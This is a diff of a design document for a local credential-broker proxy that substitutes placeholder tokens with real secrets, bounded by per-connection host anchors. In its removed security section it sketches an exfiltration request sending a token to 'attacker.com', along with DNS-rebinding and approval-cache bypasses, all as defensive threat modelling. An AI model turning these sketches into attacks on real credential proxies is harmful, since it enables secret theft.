@@ -1,182 +1,606 @@
-# SafeClaw Credential Broker — routing & injection (design, LOCKED 2026-07-01)
+# SafeClaw Credential Broker — one proxy, one phantom (design, LOCKED 2026-07-03)
 
-> **Status: LOCKED.** Converged after 3 independent red-teams (security / adoption / codebase) + resolution. Implement in **two additive stages (v1 → v2)**; the design is frozen — build, don't re-litigate.
-> **Mechanism-only** — positioning/competitive/market strategy lives in the PRIVATE `safeclaw-pro-backend/docs/STRATEGY.md`, never here.
-> Grounded in: [CONNECTIONS_AND_AUTH.md](./CONNECTIONS_AND_AUTH.md), [SERVICES.md](./SERVICES.md), [STORES_AND_ITEMS.md](./STORES_AND_ITEMS.md), [PROTOCOL.md](./PROTOCOL.md) §6, [STREAMING_APPROVAL.md](./STREAMING_APPROVAL.md).
-
-Legend: **[built]** in the tree · **[v2]** roadmap. (No mid-tier — v1 = package what's built; v2 = the complete design, additive.)
-
-> **v1 SHIPPED to `dev` 2026-07-01 (v1.0.29, build-verified; LIVE-e2e pending):** `/export` off the agent surface (403), distinct `423 vault_locked`, connect-agent modal self-provisions the key, skill field-name casing, OAuth `needs_reauth` console signal. **v2 build plan (the HOW, code-grounded + sequenced): [CREDENTIAL_BROKER_V2_BUILD.md](./CREDENTIAL_BROKER_V2_BUILD.md).**
-
----
-
-## 1. TL;DR — two additive stages (read this first)
-
-The sound, differentiated core is the **recipe path, which already exists**. Ship it, get feedback, then add the powerful-but-risky parts (per-secret anchor, passthrough, MITM) **as a pure superset — no rework of v1**.
-
-**v1 — package what already works (days; no silent-exfil holes):**
-- The shipped **recipe path**: `/use` + `/stream` + registry + `{{secret.X | b64|basic}}` filters + connection layer + captive-portal approval. **All [built].**
-- **Cold-start = TWO paths to first value (both ≤5 min, both converge on `/use`); only the secret-into-vault channel differs:**
-  - **Novice (agent + web only, NO CLI):** user tells the agent *"put X's key in my vault"* → agent points to the console (v1) / deep-link (v2) → user pastes the secret + one passkey **in the browser** → agent calls `/use/<curated-service>`. The agent never holds the secret; the human enters it in web. **Web is the universal floor — a novice never touches `sc`.**
-  - **Dev (CLI):** `sc set <secret> <value>` → `/use/<curated-service>`. `sc set` writes only a raw secret (creates **no** connection); the curated default connection is implicit (`connection_id == service_id`).
-  - Both v1 paths target a **curated** service (arbitrary/raw APIs = v2). The agent orchestrates; the human anchors (web paste + passkey, or `sc set`).
-- **The agent's one concept in v1 = the shipped `/use/<connection>` model** (registry-discovered). **Do NOT rewrite the skill toward phantoms yet.**
-- Edge: curated recipes + **residue-free `/stream` git** + passkey self-custody + cloud-blind.
-
-**v2 — the complete design (additive superset, built incrementally):**
-- **Host anchor on the CONNECTION layer** (§7 — ONE host concept, no new field): curated connection's egress host is **fixed by the recipe** (url literal, or `config.host` for a self-hosted slot) = already the anchor; a **raw secret = a degenerate connection** (`service: ""`) that **reuses `config.host`** as its anchor.
-- **Passthrough**: `/proxy` (generic) + **connection-qualified `__conn.role__` phantom** (resolves to the connection → its `resolved_hosts` + secret) + MITM/`sc run`. An arbitrary raw API needs an explicit degenerate connection (`sc connect`/console/deep-link) — separate from `sc set`.
-- **Additive refactor** (§4), `sc status` discovery shape (§9), MCP ingress, agent-authored recipes (merge `feat/per-vault-custom-recipes` first), deep-link handoff.
-
-> **⛔ HARD ORDERING RULE (intra-v2):** never let a passthrough ingress (`/proxy`, phantom, MITM) go live before **all three** land: host-anchor enforcement + exact-host (FQDN) match + host in the passthrough approval-cache key. These are **passthrough requirements, not current bugs** (the recipe path is host-safe without them — §11). *(DNS-pin is an optional hardening, not a gate — §11.)*
->
-> **v1 → v2 is purely incremental:** the connection layer already exists (implicit default connections for curated services); v2 only **adds** raw/passthrough connections (`service: ""` + `config.host`) + passthrough routes + `resolved_hosts` enforcement on the existing shapes. No new fields, no rework.
+> **Status: LOCKED — phantom-only proxy model.** This supersedes the earlier
+> two-stage `/use`+`/proxy` design (see §Superseded). Pre-launch, 0 users,
+> wipe+re-enroll: build the whole model at once, no back-compat, no staged
+> cutover.
+> **Mechanism-only** — positioning/market strategy lives in the PRIVATE
+> `safeclaw-pro-backend/docs/STRATEGY.md`, never here.
+> Grounded in: [CONNECTION_SCHEMA.md](./CONNECTION_SCHEMA.md),
+> [CONNECTIONS_AND_AUTH.md](./CONNECTIONS_AND_AUTH.md), [SERVICES.md](./SERVICES.md),
+> [PROTOCOL.md](./PROTOCOL.md) §6, [STREAMING_APPROVAL.md](./STREAMING_APPROVAL.md).
 
 ---
 
-## 2. What it is (one paragraph)
+## 1. TL;DR
 
-Give an agent the **use** of a credential without letting it **hold** the credential. On the recipe path (v1) the agent calls `/use/<connection>/<path>`; the daemon knows the URL + auth + policy, injects the real secret at egress, forwards. On the passthrough path (v2) the agent uses a **connection-qualified placeholder** and the daemon substitutes it, bounded by the connection's `resolved_hosts` (§7). The local, cloud-blind daemon is the only thing that ever sees the real value.
+Give an agent the **use** of a credential without letting it **hold** the
+credential. There is **one surface**: a **local HTTPS proxy** on the user's
+machine. The agent writes a **phantom placeholder** (`__sc__<conn>__`) wherever the
+credential belongs — an env var its tool reads, a request header it sends. The
+proxy is the only thing that ever sees the real value: it resolves the phantom →
+connection → secret, checks the destination host against the connection's
+anchor, substitutes at egress, forwards. The agent never receives the real value
+back.
 
-## 3. The mental model: two orthogonal axes over one core
+**One mental model, one sentence:** *"SafeClaw is a local proxy. Put the phantom
+where the credential goes; send your traffic through the proxy."*
 
-| | **Fill = recipe** (curated) | **Fill = raw phantom** (direct) |
+**No `/use`, no `/proxy` JSON endpoint, no base-URL rewriting.** Those are all
+special cases of "route the request through the proxy with a phantom in it."
+
+---
+
+## 2. The three questions (the whole model)
+
+A brokered request answers exactly three questions, each with **one** owner:
+
+| Question | Owner | Carrier |
 |---|---|---|
-| **Transport = explicit** | `/use/<conn>` **[v1, built]** | `POST /proxy` (conn-qualified) **[v2]** |
-| **Transport = MITM** | host→recipe **[v2]** | substitute by conn.role **[v2]** |
+| **Where does the credential go?** (injection site) | the **agent** | the phantom's position in the request (header / query / body — anywhere) |
+| **What value, produced how?** | the **vault** | phantom name → connection → secret (direct value, or the OAuth-minted token) |
+| **Is it allowed?** | the **vault** | the connection's **host anchor** + policy tree + approval |
 
-Fill = how the credential is injected; Transport = how the request reaches the daemon. They compose. **v1 exercises only the top-left (recipe × explicit) — built and sound.** The agent only ever makes the Fill choice (*"connection exists? → `/use`"*); MITM is the human's opt-in.
+**The SSOT rule chain (memorize this — it is the entire design):**
 
-## 4. The core (transport-neutral, already built) + additive refactor
+> a secret is **single-owned** by a connection (the address *is* the ownership)
+> → the **phantom is the only intent carrier** (traffic with no phantom is
+> forwarded untouched, never injected)
+> → a connection's **hosts have one source** (service-declared if a service is
+> referenced — instance may only pin within its wildcards — else the connection's
+> own user-anchored `hosts`; never overridable)
+> → **host is a constraint, never a selector** (we validate the destination
+> against the anchor; we never pick a connection *by* host).
 
-`src/server/broker.rs` is **already transport-neutral in its types** (domain `Operation` → `BrokerResponse`, no axum types); `/use` + `/stream` are already adapters. **[built]**
+Everything below is a consequence of this chain.
 
-**Refactor is ADDITIVE — respect the existing, long-validated 2-RTT flow; do NOT rewrite `approve.rs`.** The ceremony is inherently two legs across two handlers:
-- `Ingress::shape(self) -> BrokerRequest` (extract shaping)
-- `broker::decide(req) -> {Forward (allow+cache-hit only) | NeedsApproval(OpHandle) | Deny}` — leg 1 (`/use` today returns `202 pending`)
-- `broker::execute(op, grant_ctx) -> BrokerResponse` — leg 2 (post-passkey: forward + one-shot `Consumed` + cache write), stays where it is.
+## 3. Single-ownership invariant (verified)
 
-## 5. Transport axis
+**A secret belongs to at most one connection.** This is already enforced by
+storage: a secret's address is `[<conn>:]<ROLE>` — ownership is encoded in the
+name, so `secret → connection` is a total function today. Checked against the
+apparent counter-cases:
 
-- **`/use/<conn>/<path>`** — recipe-backed. **[v1, built]**
-- **`/stream/<conn>/<path>`** — streaming passthrough (git smart-HTTP, SSE). **[v1, built]** It **already approves per policy** (captive-portal + service-level floor). It uses a *coarser* policy than `/use`'s per-path rules — **this is fine and intentional** (git is a byte stream; per-path rules don't map). Unifying the two policy engines is **optional, not required**.
-- **`POST /proxy`** — generic; body `{url, method, headers, body}` with a connection-qualified phantom. **[v2]** Body == future MCP tool schema. **Gated by §1.**
-- **MITM + `sc run` env-CA** — transparent interception for dumb subprocess CLIs. **[v2]** Silent + child-scoped. **Escalation ladder** (prefer residue-free): ① agent HTTP → `/use`|`/proxy`; ② per-command override (`git clone <…/stream/…>`, `npm --registry`, `pip -i`) — covers common dumb CLIs with **zero `sc run`**; ③ recipe/`/use`; ④ only a hardcoded-URL + env-cred CLI with no cheap route → suggest `sc run` once (record in a manifest, don't re-nag).
-- **MCP** — one more ingress later; DX sugar, not the front door. **[v2]**
+- *One PAT for both REST and git* → that's **one connection, multiple hosts**
+  (the service declares them), not two connections.
+- *One key shared by two services* → vanishingly rare; copy it. Not worth
+  breaking single-ownership.
 
-## 6. Fill axis
+Because ownership is single-valued, a phantom carrying the secret's name
+resolves to a unique connection — no host-based guessing, no ambiguity.
 
-- **Recipe** (`service.toml`) — authoritative injection template: `{{secret.X}}` + filters, per-path `[policy.rules]`, OAuth via `[provider]`. **[built]**
-- **`{{secret.X | b64}}` / `{{secret.X | basic}}` pipe filters — [built]** (15 render tests).
-- **Raw phantom** — degenerate case of the template (direct insertion). **[v2]** New `__…__` delimiter (disjoint from `{{…}}`). On the passthrough path it is **connection-qualified** (`__github-work.api_key__`); bare names are rejected when >1 connection could match.
+## 4. The hierarchy — secret / connection / service (settled once)
 
-**Auth = two classes:** ① **Insertion** (bearer/apikey/query/URL/Basic) — insert, optionally with an egress filter; the vault stores the **semantic** value, the filter encodes at egress (never pre-store the encoded form). ② **Derivation/exchange** (HMAC/SigV4/OAuth1; **OAuth2** refresh→access) — daemon-side signer/minter, **recipe irreducible** (OAuth2 [built]; SigV4/HMAC reserved [v2]).
+**Secret is a 2-tuple.** Hosts are a property of the *relationship to a
+destination*, not of the value (a multi-secret connection would otherwise
+duplicate/conflict hosts across its secrets); the flat pool matches the
+env-is-vault architecture; no-broker is the natural unwrapped state.
 
-- **base64 pitfall:** a dumb tool that base64's `user:__phantom__` itself buries the phantom → route filtered/computed auth through the **recipe** path (git: `/stream/github-git` injects `Basic {{secret.github_token | basic}}`).
-- **Divergence impossible** via **replace-all-matching** (broker.rs:908-930): a declared slot → recipe wins (agent header stripped); else name-keyed.
+```
+secret      = <key, value>                            flat pool; unclaimed by any connection ⟺ no-broker
+connection  = <secret key(s), hosts> + service ref    the INSTANCE
+service     = <secret keys, hosts>  (+ oauth, hints)  the TYPE — optional, per-target knowledge
+raw conn    = a connection with NO service ref        (service is optional; no "trivial service" entity)
+```
 
-## 7. Schema — grounded in the SHIPPED connection layer (LOCKED)
+**The instance struct** (`config` is deleted — it existed to feed the retired
+template layer; `host` is promoted because it is the anchor, the single most
+security-relevant field, and the settled tuple already makes it first-class):
 
-Connections are **already implemented + shipped** (spec `CONNECTION_SCHEMA.md`; `src/storage/plaintext.rs:76`, `VaultAux.connections`, routed via `state.rs resolve_connection_service`, cache keyed by `connection_id`). **v1 uses them AS-IS — no schema change.** The SHIPPED struct:
-
-```rust
-// src/storage/plaintext.rs — the shipped Connection (do not invent fields)
-pub struct Connection {
-    pub service: String,                     // recipe TYPE id it instantiates (many connections per service). Field is `service`, NOT `recipe`.
-    pub config:  BTreeMap<String, String>,   // recipe-declared re-map slots ONLY (e.g. `host` for a self-hosted upstream); anti-SSRF; omitted when none
+```jsonc
+// STORED — aux.connections[<conn_id>].  conn_id is the map key (not repeated in the value).
+// Minimal by construction: everything else is derived or lives elsewhere.
+{
+  "service": "github",          // string | null   (null = raw)
+  "hosts":   ["api.github.com"] // string[] | null  (see the SSOT invariant)
 }
-// secret VALUES: stores["native-secrets"].items["<conn>:<role>"]  (bare name when conn==service, else <conn>:<role>)
+// secrets: NOT stored here — flat secrets pool, addressed [<conn_id>:]<KEY>; a
+//          connection's secrets are the reverse-index of that namespace.
+// policy:  NOT here — aux.policy.connections.<conn_id>.
+// phantom: NEVER stored — it is a DERIVED composite of (conn_id + a secret key);
+//          storing it would be redundant and ambiguous for multi-secret conns.
+
+// hosts has ONE source (SSOT):
+//   service = null             ⇒ hosts required (raw; normally a single host)
+//   service, exact hosts only  ⇒ hosts null (derived from the service; no stored copy)
+//   service with *.wildcards   ⇒ hosts required: exact FQDNs pinned ⊆ the wildcards
 ```
 
-**There is ONE host concept and it ALREADY EXISTS — do NOT add `allowed_hosts` or `hosts` fields** (both were dropped; they are not in the shipped design):
-- **curated, fixed host** → the recipe url literal. Per CONNECTION_SCHEMA.md §4 the egress host is **FIXED by the recipe** — a connection can NEVER re-point it (anti-SSRF). **Already the anchor.**
-- **curated, self-hosted** → `config.host` fills the recipe's declared `{{connection.host}}` slot → the rendered host is the anchor.
-- **raw / passthrough [v2]** → no recipe; **reuse `config.host`** (a connection with `service: ""`): that host IS the anchor. No new field.
+**Phantom belongs to the DISCOVERY view, not the stored record.** `sc status`
+projects each connection into the agent-facing shape. `phantoms` is a **map
+(injectable role → ready-made phantom)** — one uniform type for sole- and
+multi-secret connections (no string-vs-list split), and its keys ARE the
+injectable roles, so no separate `secrets` field:
+
+```jsonc
+// sc status (agent-facing projection — derived, not stored)
+{ "connections": [
+    { "name": "github",
+      "hosts": ["api.github.com", "github.com"],
+      "phantoms": { "GITHUB_TOKEN": "__sc__github__" } }   // sole role → the short form
+  ], "proxy": "http://127.0.0.1:23294", "routed": true }
+// multi-secret:  "phantoms": { "USERNAME": "__sc__bb__username__", "API_TOKEN": "__sc__bb__api_token__" }
+// oauth2:        "phantoms": { "ACCESS": "__sc__gmail__", "ACCOUNT_ID": "__sc__gmail__account_id__" }
+```
+
+**The service toml schema.** `[[upstream]]` is retired (it was `/use`-era
+routing; its essence was the host set). A service declares exactly what a
+minimum connection has — `secrets` + `hosts` — plus the one non-direct
+production (`[oauth2]`) and optional helper overrides:
+
+```toml
+[service]
+id = "github"
+name = "GitHub"                              # cosmetic
+
+hosts = ["api.github.com", "github.com"]     # exact FQDNs, or "*.suffix" wildcards
+secrets = ["GITHUB_TOKEN"]                   # stored keys; phantom resolves to the value as-is
+
+setup = """…"""                              # cosmetic (agent-facing prose)
+# NO auth section: Basic needs none — the scheme names itself in the header;
+# the proxy decodes it natively and substitutes the phantom inside.
+```
+
+**Host matching = the mainstream domain rule** (TLS-certificate wildcard
+semantics), no variable system:
+- a service `hosts` entry is an **exact FQDN** or **`*.suffix`** (`*` leftmost
+  only, matches exactly ONE label: `*.openai.azure.com` matches
+  `foo.openai.azure.com`, not `a.b.openai.azure.com`); bare `*` forbidden.
+- `conn.hosts` entries are **always exact FQDNs**, each required to fall inside
+  some service entry (⊆). Exact service entries anchor automatically; **a
+  wildcard entry never reaches runtime enforcement** — it only constrains what
+  the instance may PIN (human-confirmed at connect). Pinning is mandatory
+  because on `*.openai.azure.com` an attacker can stand up their own tenant —
+  without a pinned exact host the secret could egress to it (invalid there, but
+  leaked).
+- **No full override** of service hosts by the connection: curated hosts are the
+  audited anti-SSRF promise. Fully self-hosted instances (own GitLab) = **just a
+  raw connection** — insertion-auth self-hosting needs no service definition;
+  self-hosted+OAuth is deferred until a real case appears.
+
+**Named sections are auth MECHANISMS, never tools.** OAuth2 (`[upstream.auth]`
+upgraded in place; fields unchanged; `oauth2` not `oauth` — precise,
+self-documents the parse semantics):
+
+```toml
+[service]
+id = "gmail"
+name = "Gmail"
+
+hosts = ["gmail.googleapis.com"]
+
+[oauth2]
+provider = "google"                          # -> _providers/google.toml
+scopes   = ["https://www.googleapis.com/auth/gmail.send", …]
+secret   = "GMAIL_REFRESH_TOKEN"             # the stored refresh secret feeding the mint
+# exposes = ["account_id"]                   # optional extra minted/derived values →
+                                             # __sc__<conn>__account_id__ (openai-codex case)
+# __sc__<conn>__ resolves to the MINTED access token; the refresh secret is
+# referenced only by [oauth2] ⇒ internal by construction, no flag needed.
+```
+
+*(`[[api]]` is deleted along with `[[upstream]]` — it was the `/use` routing
+table; with real URLs the route is in the traffic, and policy matches
+`(host, path, method)` directly.)*
+
+**Three classes of service content:**
+1. **First-class:** `hosts` + `secrets` — the same two words as the connection
+   tuple. Direct insertion is the default and needs no declaration.
+2. **Auth-mechanism sections** — the ONLY named sections, one per mechanism,
+   each with self-evident parse semantics:
+   - **`[oauth2]`** — the phantom resolves to a minted access token.
+   - **There is NO `[basic]` section** (killed by its own existence trial):
+     the scheme names itself in the header (`Authorization: Basic …`), so the
+     proxy decodes it natively, finds the phantom, substitutes, re-encodes —
+     zero declared information needed. Constructing a pair is just another
+     phantom PLACEMENT, which is the agent's job: git → URL userinfo
+     (`https://x:__sc__github__@github.com/…`; a validated username — Bitbucket,
+     case-sensitive — is instance data the agent types there); docker →
+     `docker login -u <user> -p __sc__dockerhub__` (the phantom lands in
+     docker's config.json and rides every registry call). `sc git-credential`
+     survives only as an OPTIONAL zero-schema convenience with one documented
+     global rule: for the asked host's connection emit
+     `("x", <phantom of the sole injectable secret>)`; multiple/none → decline.
+     It reads no service data — a placement automation, like `sc run`'s env
+     pasting; not load-bearing.
+   - future `[sigv4]` etc. when real. **Tool-named sections (`[git]`,
+     `[docker]`) are forbidden.**
+3. **Cosmetic:** `name`, `setup`, UI placeholders — deletable without affecting
+   any parse or security behaviour; considered last, never allowed to shape the
+   structure.
 
 ```
-resolved_hosts(conn) =  conn.service names a recipe ?  render(recipe.upstream[*].url, conn.config) → host   // existing host-literal + host_egress_allowed path
-                                                     :  conn.config.host                                     // raw / passthrough
-enforce:  egress host ∈ resolved_hosts(conn)   (EXACT FQDN)
+resolved_hosts(conn) = conn.service ? exact_entries(service.hosts) ∪ pinned(conn.hosts ⊆ wildcard entries)
+                                    : conn.hosts                            // raw
+enforce:  destination host ∈ resolved_hosts(conn)   (always EXACT FQDN, case-insensitive, port-aware)
 ```
 
-- **Curated is anchored TODAY** (`upstream_host_has_unsafe_template` + `host_egress_allowed`); **no new storage.**
-- **The only v2 add** = allow a connection with `service: ""` + `config.host` (a raw/passthrough connection), and enforce `resolved_hosts` on the passthrough route.
-- **Passthrough phantom `__conn.role__`** → the connection → its `resolved_hosts` + which secret (name→connection via the connection layer — no new index).
-- Multi-host raw (rare) → use a curated recipe (which lists all its hosts); a raw connection is single-host (`config.host`).
-- **`host` stays inside `config` (NOT promoted to a first-class `Connection.host` field):** it is one recipe-declared re-map slot among possibly several (`host`/`subdomain`/…); the template engine reads all `{{connection.X}}` from `config` uniformly (broker.rs:188) and the recipe's `params` allowlist governs it (anti-SSRF). Promoting it would split the render source for no functional gain (`resolved_hosts()` already abstracts the anchor). Revisit only if `host` ever needs distinct typing/structure (host+port+scheme, or a list).
+## 5. Phantom syntax
 
-## 8. Host-anchor UX — who sets the connection's host (never hand-typed) [v2]
+The phantom is always a **value** (an env var's value, or an inline header/URL
+token) — never an env var *name*. The binding constraint is **round-trip
+safety**: it must survive env values, URL path/query, JSON, headers, and base64
+(the proxy decodes Basic auth before matching). ⇒ charset locked to
+**`[A-Za-z0-9_]`** (`:` and `.` are out — they break Basic-auth / URL / env-name
+round-tripping).
 
-1. **Curated recipe declares it** — zero input; multi-host correct (github.com + api.github.com + githubusercontent.com).
-2. **Agent proposes → human confirms via deep-link** `{{console}}/…/secrets/new?name=…&hosts=…` — hints prefilled, user pastes only the **value** + one passkey. **Value never in URL.**
-3. **Manual / TOFU** — no baked hint list; start deny; first unmatched host → **one-tap-widen**: a captive-portal approval that writes an **EXACT host**. Because it's a **permanent grant**, it's a **distinct, higher-friction UX** (show host + eTLD+1, cooldown), **not** the ordinary one-tap approve. If widen slips, ship enforcement in **warn/log mode** first (record, don't deny). **Exact FQDN only — never auto-widen to a bare eTLD+1** (shared-suffix hosts leak).
+```
+__sc__<conn>__<role>__          // <conn>,<role> ∈ [a-z0-9_], no double-underscore inside (__ is the delimiter)
+__sc__<conn>__                   // DEFAULT shorthand — the connection's sole injectable secret
+```
 
-## 9. Agent mental model + discovery
+- Most connections expose exactly **one** injectable secret (OAuth-refresh is
+  internal/hidden), so `__sc__<conn>__` is the everyday form; the `__<role>__`
+  suffix appears only when a connection genuinely exposes several.
+- `<conn>` is the id the user gave at connect time and sees in the UI
+  (`github`, `gmail_work`) — nothing new to learn. Connect enforces env-safe ids.
+- Storage addressing `[<conn>:]<ROLE>` (with `:`) is **unchanged** — `:` lives
+  only in internal addressing; the phantom surface uses the env-safe form.
+- The `__sc__…__` shell is a **leak breadcrumb**: an un-substituted phantom is
+  recognizable in logs/upstream errors.
+- Multi-account is disambiguated by **conn name** (`__sc__gmail__` vs
+  `__sc__gmail_work__`), never by host.
+- Parse: strip the `__sc__` prefix and trailing `__`, split the remainder on
+  `__` → 1 or 2 segments; unambiguous because ids may not contain `__`.
+- No industry standard for phantom tokens exists; `__X__` is the folk
+  placeholder idiom (scaffolding/templating), and vendor prefixes are the modern
+  secret-string convention (`ghp_`, `sk_live_`, secret-scanning). `__sc__…__`
+  carries both signals: *"I am a placeholder"* + *"SafeClaw substitutes me."*
 
-- **v1:** one concept = **"connection exists → `/use/<connection>`"** (registry-discovered). One story only.
-- **v2:** the phantom concept + a proper **`sc status` agent-discovery shape** `{secrets:[{name,anchored_host}], call_here, under_sc_run}` (today `sc status` is a human check; `/registry` returns `services`/`connected` — neither is this shape). **Preflight:** before a phantom-dependent dumb CLI, check `under_sc_run`; if not routed, explain ("needs `sc run`") instead of hitting a mysterious 401. Distinctive phantom string (`sc__…__`) = a recognizable un-substituted-leak breadcrumb.
+**Multi-profile is selected by phantom VALUE — never by env var name.** The env
+var *name* is the consuming tool's contract (`gh` reads only
+`GITHUB_TOKEN`/`GH_TOKEN`; nothing reads an invented `GITHUB_WORK__GITHUB_TOKEN`),
+so the selector must live in the value — which matches how the ecosystem already
+does profiles (`AWS_PROFILE`, kubectl contexts, per-project `.env`/direnv):
 
-## 10. Onboarding
+- persistent: per-project `.env` (`GITHUB_TOKEN=__sc__github_work__` in the work
+  repo; recorded in the manifest);
+- ad-hoc: per-command prefix (`GITHUB_TOKEN=__sc__github_work__ gh pr list`);
+- git (no env var): **the phantom itself goes in the URL username slot** —
+  `git clone https://__sc__github_work__@github.com/owner/repo` → git sends it as
+  the Basic username → the proxy substitutes. Same one concept, zero extra rules.
+  The credential helper covers only the default case (the host's default
+  connection). What the user puts in a URL username otherwise is their own
+  business — no coupling between URL usernames and connection ids is designed or
+  documented.
 
-Principles: ① min USER load; ② then AGENT load; ③ state via **discovery**, not a decision tree; ④ **drop edge scenarios** for cleanliness.
-- **Skill GENERIC** (the one concept + "call the registry; never hold raw secrets"); per-service config → recipe `[setup]` + registry.
-- **Install prompt = one-time bootstrap** (goal + anchors, not commands).
-- **Dropped edges:** (1) auto-covering a running agent → `sc run` or explicit; (2) persistent GLOBAL base-URL rewrite → per-command only (git `/stream`) + MITM; (3) early sudo system-trust CA. (git/npm/cargo are core; only the *dirty persistent mechanism* is dropped.)
-- **Clean removal = a per-project manifest**, not agent memory.
+**Storage keys are internal-only, and `:` is chosen deliberately.** The vault key
+(`[<conn>:]<ROLE>`) never reaches the agent — the agent surface is exactly two
+things: the tool's env var name (its contract) and the phantom value (ours).
+Conn ids and roles are locked to `[a-z0-9_]`; `:` sits **outside** that charset,
+so internal-address splitting is always unambiguous and an internal key can never
+be mistaken for a phantom or an env var name — three surfaces, mutually exclusive
+charsets. *Storage-only vs connection secret* is decided by **whether any
+connection claims the key**, not by key syntax.
 
-## 11. Security — the recipe path is sound; the passthrough gate
+## 6. Transport: the local HTTPS proxy + the env bundle
 
-**Recipe path (v1) is SOUND** (verified): host is a literal / declared `{{connection.x}}` (`upstream_host_has_unsafe_template`), `{{secret.*}}` in an authority rejected, connection re-map can't repoint an audited host, replace-all-matching strips agent auth. `/export` off the agent surface + OAuth curated-only remove the raw-exfil + confidential-secret paths. **⇒ v1 has no silent-exfil holes.**
+The proxy is a **local HTTPS MITM** (HTTP CONNECT). A process is brought under it
+by a bundle of environment variables — the only per-process, permission-free way
+to (a) route traffic to the proxy and (b) trust the proxy's CA (§7 has the
+first-principles reason). The **CA and proxy are resident** (generated once at
+install, private key `chmod 600`, never leaves the machine — no system-trust
+install, no GUI prompt). The bundle just points a child process at them:
 
-**Passthrough path (v2) — THREE hard gates before it goes live** (§1 ordering; passthrough requirements, **not current bugs**):
-1. **Host-anchor enforcement** (§7 `resolved_hosts`) — else `POST /proxy {url: attacker.com, …__token__}` forwards the real token with no approval (today `host_egress_allowed` permits every public host). [silent]
-2. **Exact-host (FQDN)** — else `*.github.io`/`*.vercel`/tenant subdomains exfiltrate. [silent]
-3. **Host in the passthrough approval-cache key** — today the key is `(conn, rule, method)`; safe for `/use` (host recipe-fixed), but on `/proxy` the host is request-data → approve host A, smuggle host B within TTL. Add the resolved host to the key. (Connection-scoping bounds this to the connection's human-anchored `resolved_hosts`; mainly matters for multi-host connections.) [silent]
+```
+HTTPS_PROXY / HTTP_PROXY = http://127.0.0.1:<port>
+NO_PROXY = localhost,127.0.0.1
+NODE_USE_ENV_PROXY = 1                # Node 24+ fetch honours proxy only with this
+SSL_CERT_FILE / REQUESTS_CA_BUNDLE / CURL_CA_BUNDLE / NODE_EXTRA_CA_CERTS /
+GIT_SSL_CAINFO / DENO_CERT = <resident CA path>
+```
 
-**Also required for passthrough (ship with it, not separate "gates"):**
-- **One-tap-widen = higher-friction + exact-host** (§8) — else one habituated tap persists a permanent attacker-host anchor (typosquat), thereafter silent.
-- **Connection-qualified phantoms `__conn.role__`** (§7) — bare names are ambiguous across multi-account connections; reject bare names when >1 connection matches; render the resolved connection + scope in approval/audit.
+**Selective MITM (by SNI).** The proxy decrypts + substitutes **only** for
+connections whose SNI ∈ the union of all connections' hosts; everything else is a
+**blind tunnel** (not decrypted). Wins: privacy ("we only see brokered
+traffic" — matters for the trust phase), performance, and unrelated
+cert-pinned tools are untouched.
 
-**Optional hardening (NOT a gate):** **DNS-pin on the resolved IP** — rebinding can flip an anchored name to `169.254.169.254`/internal at connect time (guard checks the name; `reqwest` re-resolves). Its value = reaching **internal/cloud-metadata** IPs behind a name-based block — a **hosted/shared-daemon** concern, **not** the **local** daemon (a local agent can reach localhost/LAN directly anyway; the cloud daemon is being retired). **Low priority; add only if a hosted/shared daemon is reintroduced.**
+**Scopes** — same bundle, three reaches (the only real degree of freedom):
 
-**Honest posture:** even fully built, the human anchor is defeatable by **habituation** (true of all human-approval security). The claim = "agent never holds the key + host-anchored egress + human confirms new destinations" = **strictly better than status quo** (agent holds raw key, sends anywhere silently), not "unbreakable." The real defense = keep widen prompts **rare + salient** (default to curated/correct hosts).
+| Scope | Who | How |
+|---|---|---|
+| one command | agent, zero human | `sc run -- git push` — the only self-service form for an already-running agent; the default |
+| whole session | human, once | `eval "$(sc run --export-env)"` — covers the shell |
+| whole agent / service | human, once | launch the agent under `sc run`, or write the bundle into its systemd `Environment=` / docker env |
 
-## 12. Known risks / open (don't re-litigate)
+`sc run` is a **thin env-paster** over the resident CA/proxy — it does not spin up
+a per-process CA or proxy. Its ancestor "export all secrets to env vars as
+plaintext then exec" is **dropped** (§Decided-NOT).
 
-- **Human anchor is habituation-defeatable** — inherent; mitigate with rarity + proportional friction (§11).
-- **Passthrough ordering** — §1 gate; the recipe path is safe without it (items are v2 requirements, not current bugs).
-- **`/use` vs `/stream` policy asymmetry** — intentional (byte stream); unify only if desired, not required (§5).
-- **`broker` refactor is additive**, not a rewrite — `decide`/`execute` respect the existing 2-RTT flow (§4).
-- **ONE host concept on the connection** (§7): curated = recipe-fixed (url literal / `config.host` slot); raw = reuses `config.host` — **no new field**, no `allowed_hosts`/`hosts`, no side-table, no per-item bytes/sudp change.
-- **Agent-authored recipe correctness** — v1/v2 scope agent-authored recipes to **insertion auth + human-anchored host** (verifiable); OAuth/signing = **curated-only** (a non-expert can't audit a subtly-wrong OAuth recipe; also avoids `client_secret`-marked-public leak). `client_type=public` stays a validator gate.
-- **Anchor bounds destination, not action** — a raw secret can hit any path on its allowed host (no path scope without a recipe); equivalent to the user holding the token.
-- **Coverage gaps (accepted):** cert-pinned dumb CLIs; non-REST (gRPC/websocket/byte-signed) beyond `/stream`.
+## 7. Why env vars are the mechanism (first principles)
 
-## 13. Build order
+Bringing one process's traffic under our CA needs two independent things:
+**(a)** the traffic reaches our proxy, and **(b)** the process trusts our root.
+The OS gives **no per-process trust switch** — TLS trust is decided inside each
+process's own TLS stack, and the one global switch (system trust store) is behind
+a GUI-authorization prompt on macOS (Apple removed silent CLI trust in Big Sur;
+only MDM profiles bypass it). So the only permission-free, per-process path is the
+env-var interface each stack *chooses* to honour. These are decades-old
+documented interfaces (`SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`, …) — stable, but
+per-stack conventions, not an OS guarantee. Hence coverage is a **matrix**, and
+the gaps are handled by adaptors (§8), not by forcing it.
 
-**v1 (package + polish what's built):** productize `/use`+`/stream`+registry+filters; polish BOTH cold-start paths (novice: agent→web console paste+passkey→`/use`; dev: `sc set`→`/use`) into a ≤5-min first win — web is the universal floor, a novice never touches `sc`; keep the skill on the `/use` model.
-**v2 (additive superset, gated by §1):** host anchor on the connection (`config.host` for raw / recipe-fixed for curated) + `resolved_hosts` enforcement (exact-host) → `/proxy` + connection-qualified `__conn.role__` + host-in-passthrough-cache-key → MITM/`sc run` → additive `decide`/`execute`+`Ingress` refactor → `sc status` discovery shape → MCP → agent-authored recipes (merge `feat/per-vault-custom-recipes` first) → deep-link. *(DNS-pin = optional hardening, not gated — §11.)*
+Verified holes (route these via adaptor, not MITM):
 
